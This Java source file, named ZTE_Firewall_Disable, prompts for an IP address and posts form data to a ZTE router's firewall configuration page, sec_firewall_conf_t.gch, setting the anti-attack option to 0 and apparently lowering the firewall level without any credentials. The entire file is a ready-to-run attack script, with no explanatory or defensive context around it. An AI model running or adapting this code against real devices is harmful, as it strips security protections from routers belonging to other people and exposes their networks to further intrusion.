package client;

import java.io.BufferedReader;
import java.io.DataOutputStream;

import java.io.InputStreamReader;
import java.io.IOException;

import java.net.MalformedURLException;
import java.net.URL;

import java.net.URLConnection;

import java.util.HashMap;
import java.util.Map;

import java.util.StringJoiner;

import javax.swing.JOptionPane;

public class ZTE_Firewall_Disable {
    public static void main(String[] args) {
    String ip = JOptionPane.showInputDialog("Input IP Address");
    try{	
	  URL url = new URL("http://"+ip+"/sec_firewall_conf_t.gch");
                            String postData = "Level=1&AntiAttack=0&IF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1";
                            URLConnection conn = url.openConnection();
                            conn.setDoOutput(true);
                            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                            conn.setRequestProperty("Content-Length", Integer.toString(postData.length()));

                            try (DataOutputStream dos = new DataOutputStream(conn.getOutputStream())) {
                                    dos.writeBytes(postData);
                            }
}
catch(Exception murle){
murle.printStackTrace();
}
}
}
